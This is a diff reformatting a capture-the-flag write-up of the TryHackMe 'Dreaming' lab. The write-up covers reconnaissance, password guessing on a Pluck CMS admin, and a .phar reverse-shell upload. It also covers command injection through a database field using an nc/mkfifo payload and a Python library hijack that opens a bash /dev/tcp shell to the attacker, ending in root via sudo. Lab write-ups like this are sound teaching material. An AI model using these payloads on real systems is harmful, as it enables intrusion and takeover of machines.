@@ -5,9 +5,10 @@
 |-------------|------------|------------------------------|
 | Solve the riddle that dreams have woven. | Easy | [Dreaming Room](https://tryhackme.com/room/dreaming) |
 
-
+---
 
 ### - Recon:
+
 We will stat with an nmap scna:
 
 ```bash
@@ -25,13 +26,15 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
-... We see here, only 2 ports open, let's check http.
-***
+
+ We see here, only 2 ports open, let's check http.
+---
 
 ### - Enumeration:
-... I tried to visit http
-... ![Apache Ubuntu Default Page](https://i.ibb.co/HPp3YK9/apache.png)
-... Just the default apach2 page, nothing special there i checked source code, so the only thing left is file & directory fuzzing, let's do that :
+
+I tried to visit http
+![Apache Ubuntu Default Page](https://i.ibb.co/HPp3YK9/apache.png)
+Just the default apach2 page, nothing special there i checked source code, so the only thing left is file & directory fuzzing, let's do that :
 
 ```bash
  s4cript> dirb http://$VMip
@@ -53,26 +56,26 @@ GENERATED WORDS: 4612
 ==> DIRECTORY: http://10.10.44.184/app/
 
 ```
-... We got a hit with /app, let' see what's there :
-... ![/app_directory](https://i.ibb.co/ZW687zG/app.png)
-...  We discover a hidden directory that contains a website CMS called Pluck.
-... Interesting, let's click on that:
-... ![dreaming_page](https://i.ibb.co/ngtgv1g/dreaming.png)
-... So from what we clicked we know that this site runs pluck 4.7.13 which is a content management system (CMS), we see in the bottom admin, and when clicking that we get a login page :
-... ![login_page](https://i.ibb.co/RchYjrR/login.png)
-... Nice , we only need the password , but we don't have that , let's try some common passwords , after a short time, I obtained the correct password it's 'password':
-... ![dashbord](https://i.ibb.co/yQbtX44/dashboard.png)
-... And we're in, that's the administration dashboard, now let's search if this CMS version has any vulnerabilities, and we found one, it's vulnerable to File Upload Remote Code Execution :
-... ![exploit](https://i.ibb.co/j6nGDRh/vuln.png)
-... And we see the exploit from ExploitDB :
-... ![exploitdb](https://i.ibb.co/7JQHd0H/exploit.png)
-... After checking that python exploit, we find that it's uploading a .phar file (which is one of many other php extensions) that contains a web shell, since we know the way let's do that manually.
+We got a hit with /app, let' see what's there :
+![/app_directory](https://i.ibb.co/ZW687zG/app.png)
+We discover a hidden directory that contains a website CMS called Pluck.
+Interesting, let's click on that:
+![dreaming_page](https://i.ibb.co/ngtgv1g/dreaming.png)
+So from what we clicked we know that this site runs pluck 4.7.13 which is a content management system (CMS), we see in the bottom admin, and when clicking that we get a login page :
+![login_page](https://i.ibb.co/RchYjrR/login.png)
+Nice , we only need the password , but we don't have that , let's try some common passwords , after a short time, I obtained the correct password it's 'password':
+![dashbord](https://i.ibb.co/yQbtX44/dashboard.png)
+And we're in, that's the administration dashboard, now let's search if this CMS version has any vulnerabilities, and we found one, it's vulnerable to File Upload Remote Code Execution :
+![exploit](https://i.ibb.co/j6nGDRh/vuln.png)
+And we see the exploit from ExploitDB :
+![exploitdb](https://i.ibb.co/7JQHd0H/exploit.png)
+After checking that python exploit, we find that it's uploading a .phar file (which is one of many other php extensions) that contains a web shell, since we know the way let's do that manually.
 ### Exploitation:
-... So first we go to the uploading page, which we can find in the navbar 'manage files' :
-... ![navber](https://i.ibb.co/X4yDcjv/navbar.png)
-... So we get this page:
-... ![upload](https://i.ibb.co/vQHqycv/upload.png)
-... Grabbing a PHP reverse shell, then simply switching its extension from .php to phar.
+So first we go to the uploading page, which we can find in the navbar 'manage files' :
+![navber](https://i.ibb.co/X4yDcjv/navbar.png)
+So we get this page:
+![upload](https://i.ibb.co/vQHqycv/upload.png)
+Grabbing a PHP reverse shell, then simply switching its extension from .php to phar.
 
 ```bash
 This command to copy the reverse shell from /usr/share/webshells/php directory to where you stay
@@ -80,9 +83,9 @@ This command to copy the reverse shell from /usr/share/webshells/php directory t
 This is command to change name for the php-reverse-shell.php to shell.phar
  s4cript> mv php-reverse-shell.php rev_shell.phar
 ```
-... Now we upload that file, after that we get this page :
-... ![uploaded_file](https://ibb.co/1nY7ZKC/uploaded.png)
-... We start a listener, then we click on that lens icon, and the file gets called and we get a reverse shell :
+Now we upload that file, after that we get this page :
+![uploaded_file](https://ibb.co/1nY7ZKC/uploaded.png)
+We start a listener, then we click on that lens icon, and the file gets called and we get a reverse shell :
 ```bash
  s4cript> nc -lnvp 1234     
 listening on [any] 1234 ...
@@ -96,16 +99,21 @@ $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ 
 ```
-... i like to run this commands when i connected with non-interactive reverse shell , that it's optional But it's help me to dealing with machines after i get a non-interactive reverse shell
+
+i like to run this commands when i connected with non-interactive reverse shell , that it's optional But it's help me to dealing with machines after i get a non-interactive reverse shell
+
 ```bash
 This command to elevate our Shell to interact shell(bash shell)
 $ /bin/bash -i
 Setting TERM(it's environment variable.) to xterm(it's is a terminal type, representing the X Terminal Emulator.) can help ensure proper display and functionality when running programs that rely on terminal capabilities
 $export TERM=xterm
 ```
-... We get foothold on the machine as www-data , Now it's time to find other users.
+We get foothold on the machine as www-data , Now it's time to find other users.
+
 ### Enumeration users:
-... First we need to see all the users present on the machine by read the 'passwd' file:
+
+First we need to see all the users present on the machine by read the 'passwd' file:
+
 ```bash
 $ cat /etc/passwd | grep 'bash'
 root:x:0:0:root:/root:/bin/bash
@@ -115,9 +123,11 @@ morpheus:x:1002:1002::/home/morpheus:/bin/bash
 $ 
 ```
 
-... So we have 3 users: lucien & death & morpheus , okay:
+So we have 3 users: lucien & death & morpheus , okay:
+
 ### Lucien Flag
-... After some enumeration we find intersteing files in /opt Directory:
+
+After some enumeration we find intersteing files in /opt Directory:
 
 ```bash
 www-data@dreaming:/opt$ ls -la
@@ -129,7 +139,8 @@ drwxr-xr-x 20 root   root   4096 Jul 28  2023 ..
 -rwxr-xr-x  1 lucien lucien  483 Aug  7  2023 test.py
 www-data@dreaming:/opt$ 
 ```
-... we checked those files , guess.. we find a password in test.py , that's very nice:
+
+we checked those files , guess.. we find a password in test.py , that's very nice:
 
 ```bash
 www-data@dreaming:/opt$ cat test.py
@@ -156,7 +167,7 @@ else:
 www-data@dreaming:/opt$   
 ```
 
-... We notice the password includes Lucien's name, suggesting it might be his password. Let's attempt it on SSH.
+We notice the password includes Lucien's name, suggesting it might be his password. Let's attempt it on SSH.
 
 ```bash
  s4cript  ssh lucien@10.10.35.14             
@@ -227,8 +238,8 @@ Last login: Mon Aug  7 23:34:46 2023 from 192.168.1.102
 lucien@dreaming:~$ 
 ```
 
-... And we are lucien now , cool.
-... let's run ls command
+And we are lucien now , cool.
+let's run ls command
 
 ```bash
 lucien@dreaming:~$ ls
@@ -238,9 +249,9 @@ THM{REDACTED}
 lucien@dreaming:~$
 ```
 
-... yah , we find the first flag now
+yah , we find the first flag now
 ### Death Flag
-... let's run sudo -l command now:
+let's run sudo -l command now:
 
 ```bash
 lucien@dreaming:~$ sudo -l
@@ -252,8 +263,8 @@ User lucien may run the following commands on dreaming:
 lucien@dreaming:~$ 
 ```
 
-... It appears we have the ability to execute /usr/bin/python3 /home/death/getDreams.py as the user 'death'.
-... It's time to execute 'ls -l' command on this file and specify what permissions we have on this file.
+It appears we have the ability to execute /usr/bin/python3 /home/death/getDreams.py as the user 'death'.
+It's time to execute 'ls -l' command on this file and specify what permissions we have on this file.
 
 ```bash
 lucien@dreaming:~$ ls -l /home/death/getDreams.py 
@@ -261,8 +272,8 @@ lucien@dreaming:~$ ls -l /home/death/getDreams.py
 lucien@dreaming:~$ 
 ```
 
-... We see here , we have just execute permission , so we can't read it or write on this file
-.. So , then i remembered seeing this file name before, that was in the /opt directory, let's read that file (assuming this script is a copy of that one in death's home directory) :
+We see here , we have just execute permission , so we can't read it or write on this file
+So , then i remembered seeing this file name before, that was in the /opt directory, let's read that file (assuming this script is a copy of that one in death's home directory) :
 
 ```bash
 lucien@dreaming:/opt$ cat getDreams.py 
@@ -323,24 +334,24 @@ getDreams()
 lucien@dreaming:/opt$ 
 ```
 
-... This script establishes a connection to the MySQL database, targeting the library DB. It proceeds to fetch the 'dreamer' and 'dream' columns from the 'dreams' table, then outputs them using the echo command.
-... Let's focus on command variable:
+This script establishes a connection to the MySQL database, targeting the library DB. It proceeds to fetch the 'dreamer' and 'dream' columns from the 'dreams' table, then outputs them using the echo command.
+Let's focus on command variable:
 
 ```bash
 command = f"echo {dreamer} + {dream}"
 ```
 
-... If we can manipulate the value of either of these variables, we can achieve command execution through command substitution. This technique replaces the command itself with the output of another command enclosed within $(), enabling Bash to execute the command and substitute its standard output accordingly.
+If we can manipulate the value of either of these variables, we can achieve command execution through command substitution. This technique replaces the command itself with the output of another command enclosed within $(), enabling Bash to execute the command and substitute its standard output accordingly.
 
-... Feel free to experiment with this approach on the target machine to gain a deeper understanding of its functionality.
+Feel free to experiment with this approach on the target machine to gain a deeper understanding of its functionality.
 
 ```bash
 lucien@dreaming:/opt$ echo "$(whoami)"
 lucien
 ```
 
-... We observe the successful execution of the whoami command, illustrating the identical concept we aim to employ to attain command execution as the user 'death'.
-... The sole hurdle we encounter lies in obtaining the credentials for the database, which we currently lack. However, through meticulous enumeration, we may uncover them within Lucien's bash history file.
+We observe the successful execution of the whoami command, illustrating the identical concept we aim to employ to attain command execution as the user 'death'.
+The sole hurdle we encounter lies in obtaining the credentials for the database, which we currently lack. However, through meticulous enumeration, we may uncover them within Lucien's bash history file.
 
 ```bash
 lucien@dreaming:~$ cat $HOME/.bash_history
@@ -349,7 +360,7 @@ mysql -u lucien -p[REDACTED]
 ...
 ```
 
-... With the acquired credentials, let's proceed to log in to the database and navigate to the 'dreams' table.
+With the acquired credentials, let's proceed to log in to the database and navigate to the 'dreams' table.
 
 ```bash
 mysql> show databases;
@@ -389,14 +400,14 @@ mysql> select * from dreams;
 4 rows in set (0.00 sec)
 ```
 
-... Next, we'll append another entry ('s4cript') into the table, leveraging a reverse shell within command substitution to execute arbitrary commands.
+Next, we'll append another entry ('s4cript') into the table, leveraging a reverse shell within command substitution to execute arbitrary commands.
 
 ```bash
 INSERT INTO dreams (dreamer, dream) VALUES ('s4cript', '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $attacker_ip $attacker_port >/tmp/f)');
 Query OK, 1 row affected (0.01 sec)
 ```
 
-... Now, we establish a listener and execute the Python file, triggering the execution of the reverse shell.
+Now, we establish a listener and execute the Python file, triggering the execution of the reverse shell.
 
 ```bash
 s4cript> nc -lnvp $attacker_port
@@ -412,12 +423,12 @@ listening on [any] $attacker_port ...
 connect to [attacker_ip] from (UNKNOWN) [VMip] 47202
 ```
 
-... We've successfully obtained a shell as the user 'death', leaving only one user remaining: Morpheus.
+We've successfully obtained a shell as the user 'death', leaving only one user remaining: Morpheus.
 
 ## - Privilege Escalation
 ### Morpheus Flag
 
-... As part of my standard enumeration process, I typically examine which files or directories the compromised user has write permissions for, a task accomplished using the find command:
+As part of my standard enumeration process, I typically examine which files or directories the compromised user has write permissions for, a task accomplished using the find command:
 
 ```bash
 death@dreaming:~$ find / ! -path "/proc/*" ! -path "/sys/*" ! -path "/home/death/*" -type f -writable 2>/dev/null
@@ -429,14 +440,14 @@ death@dreaming:~$ find / ! -path "/proc/*" ! -path "/sys/*" ! -path "/home/death
 /opt/getDreams.py
 ```
 
-... Interesting discovery. We have write permissions to two Python libraries: shutil and fnmatch. While we haven't identified a method to exploit this yet, let's continue our enumeration efforts.
-... I've opted to run pspy64 to monitor live running processes, and one particular process has piqued my interest:
+Interesting discovery. We have write permissions to two Python libraries: shutil and fnmatch. While we haven't identified a method to exploit this yet, let's continue our enumeration efforts.
+I've opted to run pspy64 to monitor live running processes, and one particular process has piqued my interest:
 
 ```bash
 CMD: UID=1002  PID=5981   | /usr/bin/python3.8 /home/morpheus/restore.py
 ```
 
-... The user with the UID 1002 (identified as Morpheus) is executing a Python file located at /home/morpheus/restore.py. Let's attempt to read its contents:
+The user with the UID 1002 (identified as Morpheus) is executing a Python file located at /home/morpheus/restore.py. Let's attempt to read its contents:
 
 ```bash
 death@dreaming:~$ cat /home/morpheus/restore.py
@@ -450,14 +461,15 @@ backup(src_file, dst_file)
 print("The kingdom backup has been done!")
 ```
 
-... Remarkable! The Python script employs the shutil library, and as we're aware, we have write access to this library. Let's inject some malicious Python code into the library. When the script is executed and imports this library, it will trigger the execution of our Python code.
-... Let's proceed to overwrite the library with a Python reverse shell:
+Remarkable! The Python script employs the shutil library, and as we're aware, we have write access to this library. Let's inject some malicious Python code into the library. When the script is executed and imports this library, it will trigger the execution of our Python code.
+
+Let's proceed to overwrite the library with a Python reverse shell:
 
 ```bash
 death@dreaming:~$ echo "import os;os.system(\"bash -c 'bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1'\")" > /usr/lib/python3.8/shutil.py
 ```
 
-... Following the overwrite, we establish a listener and patiently wait. Eventually, our diligence pays off as we receive a connection:
+Following the overwrite, we establish a listener and patiently wait. Eventually, our diligence pays off as we receive a connection:
 
 ```bash
 s4cript> nc -lvnp $attacker_port
@@ -468,7 +480,7 @@ id
 uid=1002(morpheus) gid=1002(morpheus) groups=1002(morpheus),1003(saviors)
 ```
 
-... We've successfully obtained a shell as Morpheus. Now, let's execute 'sudo -l' to determine the user's sudo privileges:
+We've successfully obtained a shell as Morpheus. Now, let's execute 'sudo -l' to determine the user's sudo privileges:
 
 ```bash
 morpheus@dreaming:~$ sudo -l
@@ -479,7 +491,7 @@ User morpheus may run the following commands on dreaming:
     (ALL) NOPASSWD: ALL
 ```
 
-... With the ability to execute any command as any user, let's elevate privileges to root:
+With the ability to execute any command as any user, let's elevate privileges to root:
 
 ```bash
 morpheus@dreaming:~$ sudo su
@@ -489,7 +501,7 @@ root@dreaming:/home/morpheus# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-... Success! We now have a root shell.
+Success! We now have a root shell.
 
 #### Follow me on
 
